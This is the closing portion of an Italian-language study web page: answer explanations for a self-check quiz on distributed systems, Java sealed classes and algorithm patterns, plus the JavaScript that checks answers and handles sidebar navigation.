                correctText: '✅ Corretto! Con sealed classes, il compilatore conosce TUTTE le sottoclassi possibili a compile-time. Quindi in uno switch può verificare che tu abbia coperto tutti i casi (exhaustiveness check). Se aggiungi una nuova sottoclasse, il compilatore ti forza ad aggiornare tutti gli switch. Questo elimina il rischio di "dimenticare" un caso.',
                incorrectText: {
                    a: '❌ Sbagliato. Non c\'è differenza di performance significativa. Il vantaggio è statico (compile-time), non runtime.',
                    c: '❌ Sbagliato. I record possono essere usati nei pattern indipendentemente dalle sealed classes. Sono feature ortogonali che funzionano bene insieme.',
                    d: '❌ Sbagliato. Il destructuring (record patterns) è una feature dei record, non delle sealed classes. Sealed classes riguardano l\'ereditarietà chiusa.'
                }
            },
            // Modulo 17: Distributed Systems Avanzati
            q81: {
                correct: 'c',
                correctText: '✅ Corretto! In una saga choreography, ogni servizio è responsabile di pubblicare eventi di compensazione quando fallisce. Gli altri servizi ascoltano questi eventi e eseguono le loro compensazioni. Non c\'è coordinatore centrale: è la "danza" degli eventi che gestisce il rollback. Il servizio che fallisce pubblica un evento tipo "BookingFailed" che triggera compensazioni a catena.',
                incorrectText: {
                    a: '❌ Sbagliato. Il message broker (Kafka, RabbitMQ) non ha logica di business. Non sa cosa sia un "fallimento" a livello applicativo.',
                    b: '❌ Sbagliato. Il servizio successivo non può sapere automaticamente che deve fare rollback. Serve un evento esplicito di fallimento/compensazione.',
                    d: '❌ Sbagliato. 2PC e Saga sono approcci alternativi, non complementari. Il punto della Saga è evitare 2PC con le sue problematiche (blocking, SPOF).'
                }
            },
            q82: {
                correct: 'b',
                correctText: '✅ Corretto! Con dual-write, se l\'applicazione crasha tra la scrittura su DB e la pubblicazione su Kafka, hai inconsistenza: il dato esiste nel DB ma l\'evento non è mai stato pubblicato. Con Outbox, entrambi sono nella STESSA transazione DB: se il commit fallisce, nessuno dei due viene salvato. Se il commit ha successo, l\'evento sarà sicuramente pubblicato (dal poller o CDC).',
                incorrectText: {
                    a: '❌ Sbagliato. In realtà Outbox scrive DUE volte nel DB (dato + evento). La performance non è il vantaggio principale.',
                    c: '❌ Sbagliato. Outbox pattern funziona con qualsiasi message broker, ma questo non è il suo vantaggio principale.',
                    d: '❌ Sbagliato. L\'idempotenza nei consumer è comunque necessaria! Outbox garantisce at-least-once, quindi i consumer potrebbero ricevere duplicati.'
                }
            },
            q83: {
                correct: 'a',
                correctText: '✅ Corretto! Raft richiede una MAGGIORANZA (quorum) per eleggere un leader e per committare log entries. Con 5 nodi, la maggioranza è 3. Con 2 nodi rimasti, non puoi raggiungere la maggioranza di 5 (2 < 3). Senza quorum, il cluster diventa read-only (può servire read da dati già committed, ma non può accettare nuove write).',
                incorrectText: {
                    b: '❌ Parzialmente corretto: i log devono essere replicati sulla maggioranza, ma questo È il quorum. La risposta più precisa è che serve la maggioranza per QUALSIASI decisione.',
                    c: '❌ Sbagliato. Non esiste una formula "N-2". La regola è "maggioranza", cioè più della metà dei nodi totali.',
                    d: '❌ Sbagliato. In Raft, i follower comunicano SOLO con il leader, non tra loro. Il leader coordina tutto.'
                }
            },
            q84: {
                correct: 'd',
                correctText: '✅ Corretto! Exactly-once semantics si ottiene combinando at-least-once delivery (retry garantisce che il messaggio arriva) con processing idempotente (duplicati producono lo stesso risultato). L\'idempotenza si implementa con deduplication (es: salvare message ID già processati). Senza deduplication, at-least-once può causare processing duplicato.',
                incorrectText: {
                    a: '❌ Sbagliato. Auto-commit può committare offset prima del processing, rischiando data loss (at-most-once).',
                    b: '❌ Sbagliato. Commit prima del processing = at-most-once. Se il consumer crasha dopo commit ma prima del processing, il messaggio è perso.',
                    c: '❌ Sbagliato. Commit dopo processing = at-least-once, non exactly-once. Se crasha dopo processing ma prima del commit, il messaggio viene riprocessato.'
                }
            },
            q85: {
                correct: 'c',
                correctText: '✅ Corretto! Se il processo ha una GC pause (o qualsiasi stall) più lunga del TTL, il lock scade mentre il processo pensa ancora di averlo. Un altro processo può acquisire il lock, ma il primo continua a eseguire la sezione critica. Risultato: due processi nella sezione critica contemporaneamente. Per questo servono fencing tokens o meccanismi più robusti.',
                incorrectText: {
                    a: '❌ Sbagliato. Redis è molto veloce (sub-millisecond latency). La velocità non è il problema.',
                    b: '❌ Sbagliato. SETNX supporta TTL (SET key value NX PX milliseconds). Il TTL è fondamentale per evitare lock zombie.',
                    d: '❌ Sbagliato. Redis supporta operazioni atomiche, inclusi script Lua per operazioni multi-step.'
                }
            },
            // Modulo 18: Coding Patterns Avanzati
            q86: {
                correct: 'b',
                correctText: '✅ Corretto! Memoization è lazy: calcola un sottoproblema solo quando serve (se il ramo dell\'albero di ricorsione lo richiede). Tabulation è eager: riempie tutta la tabella sistematicamente. In alcuni problemi, memoization può essere più efficiente se non tutti i sottoproblemi sono necessari. Ma tabulation evita l\'overhead della ricorsione.',
                incorrectText: {
                    a: '❌ Sbagliato. Dipende dal problema. Spesso hanno la stessa complessità asintotica. La differenza è quali sottoproblemi vengono calcolati.',
                    c: '❌ Sbagliato. Memoization usa stack ricorsivo + cache. Tabulation usa solo l\'array. A volte tabulation usa meno memoria, a volte è il contrario.',
                    d: '❌ Sbagliato. Memoization funziona benissimo con problemi multidimensionali (usa Map o array multidimensionale come cache).'
                }
            },
            q87: {
                correct: 'c',
                correctText: '✅ Corretto! La finestra si contrae quando trovi un carattere che è già presente nella finestra corrente (duplicato). Sposti il puntatore sinistro OLTRE l\'ultima occorrenza del carattere duplicato. Questo mantiene la proprietà "nessun carattere ripetuto" nella finestra.',
                incorrectText: {
                    a: '❌ Sbagliato. Non c\'è dimensione massima prefissata. La finestra può crescere quanto vuole finché non ci sono duplicati.',
                    b: '❌ Sbagliato. Non contrai ad ogni iterazione. Contrai solo quando la finestra diventa invalida (duplicato trovato).',
                    d: '❌ Sbagliato. La finestra deve contrarsi per mantenere la proprietà "no duplicati". Se non contraessi mai, avresti duplicati.'
                }
            },
            q88: {
                correct: 'a',
                correctText: '✅ Corretto! L\'area è base * min(height). Se muovi il puntatore con altezza maggiore, la base diminuisce E l\'altezza non può aumentare (è limitata dal minore che non hai mosso). Quindi l\'area può solo diminuire. Muovendo quello minore, speri di trovare un\'altezza maggiore che compensi la base ridotta.',
                incorrectText: {
                    b: '❌ Sbagliato. Non c\'è bisogno di ordinare i puntatori. Partono già agli estremi e si muovono verso il centro.',
                    c: '❌ Sbagliato. Non è arbitrario! Muovere quello maggiore non può MAI migliorare il risultato. La strategia è deterministica e ottimale.',
                    d: '❌ Sbagliato. La larghezza diminuisce di 1 ad ogni mossa, indipendentemente da quale puntatore muovi.'
                }
            },
            q89: {
                correct: 'd',
                correctText: '✅ Corretto! Invece di controllare l\'intera board (O(n)), usiamo tre Set: uno per le colonne occupate, uno per la diagonale row-col (stessa differenza = stessa diagonale), uno per row+col (stessa somma = stessa anti-diagonale). Il lookup nei Set è O(1), quindi la validazione è O(1).',
                incorrectText: {
                    a: '❌ Sbagliato. Devi controllare anche colonne e diagonali, non solo la riga.',
                    b: '❌ Sbagliato. Una matrice NxN richiederebbe O(n) per controllare righe/colonne/diagonali. I Set sono più efficienti.',
                    c: '❌ Sbagliato. L\'ordinamento non aiuta per verificare minacce sulle diagonali.'
                }
            },
            q90: {
                correct: 'b',
                correctText: '✅ Corretto! Se nums[left] <= nums[mid], significa che non c\'è "rotazione" tra left e mid, quindi quella metà è ordinata. Altrimenti, la rotazione è nella metà sinistra, quindi la metà DESTRA è ordinata. Una volta identificata la metà ordinata, puoi decidere se il target è lì dentro (e restringere la ricerca) o nell\'altra metà.',
                incorrectText: {
                    a: '❌ Sbagliato. Confrontare con target ti dice se hai trovato l\'elemento, non quale metà è ordinata.',
                    c: '❌ Sbagliato. Puoi risolvere in una singola binary search senza trovare prima il punto di rotazione. È più elegante e ha la stessa complessità.',
                    d: '❌ Sbagliato. Confrontare mid con mid+1 ti direbbe se il minimo è tra loro, ma non quale metà è ordinata.'
                }
            }
        };

        function checkAnswer(questionId) {
            const questionEl = document.querySelector(`[data-correct]#feedback-${questionId}`)?.closest('.quiz-question')
                || document.querySelector(`.quiz-question:has(#feedback-${questionId})`);

            if (!questionEl) return;

            const correctAnswer = questionEl.dataset.correct;
            const selectedOption = questionEl.querySelector(`input[name="${questionId}"]:checked`);

            if (!selectedOption) {
                alert('Seleziona una risposta prima di verificare!');
                return;
            }

            const selectedValue = selectedOption.value;
            const feedbackEl = document.getElementById(`feedback-${questionId}`);
            const allOptions = questionEl.querySelectorAll('.quiz-option');

            // Reset previous states
            allOptions.forEach(opt => {
                opt.classList.remove('correct', 'incorrect');
            });

            // Mark correct and incorrect
            allOptions.forEach(opt => {
                const optValue = opt.dataset.value;
                if (optValue === correctAnswer) {
                    opt.classList.add('correct');
                } else if (optValue === selectedValue) {
                    opt.classList.add('incorrect');
                }
            });

            // Show feedback
            const explanation = explanations[questionId];
            if (selectedValue === correctAnswer) {
                feedbackEl.className = 'feedback correct';
                feedbackEl.innerHTML = `<strong>Esatto!</strong>${explanation.correctText}`;
            } else {
                feedbackEl.className = 'feedback incorrect';
                feedbackEl.innerHTML = `<strong>Risposta errata</strong>${explanation.incorrectText[selectedValue]}<br><br><em>La risposta corretta era l'opzione ${correctAnswer.toUpperCase()}:</em> ${explanation.correctText.replace('✅ Corretto! ', '')}`;
            }

            // Disable further changes
            questionEl.querySelectorAll('input').forEach(input => input.disabled = true);
            questionEl.querySelector('.check-btn').disabled = true;
        }

        // Mobile menu toggle
        function toggleMobileMenu() {
            document.querySelector('.sidebar').classList.toggle('open');
            document.querySelector('.mobile-overlay').classList.toggle('active');
        }

        // Smooth scrolling for sidebar links
        document.querySelectorAll('.nav-link').forEach(link => {
            link.addEventListener('click', function(e) {
                const href = this.getAttribute('href');
                if (href.startsWith('#')) {
                    e.preventDefault();
                    const target = document.querySelector(href);
                    if (target) {
                        target.scrollIntoView({ behavior: 'smooth' });
                    }

                    // Update active state
                    document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
                    this.classList.add('active');

                    // Close mobile menu after navigation
                    if (window.innerWidth <= 768) {
                        document.querySelector('.sidebar').classList.remove('open');
                        document.querySelector('.mobile-overlay').classList.remove('active');
                    }
                }
            });
        });

        // Update active nav on scroll
        window.addEventListener('scroll', () => {
            const sections = document.querySelectorAll('section[id], header[id]');
            let current = '';

            sections.forEach(section => {
                const sectionTop = section.offsetTop;
                if (scrollY >= sectionTop - 100) {
                    current = section.getAttribute('id');
                }
            });

            document.querySelectorAll('.nav-link').forEach(link => {
                link.classList.remove('active');
                if (link.getAttribute('href') === `#${current}`) {
                    link.classList.add('active');
                }
            });
        });
    </script>
</body>
</html>
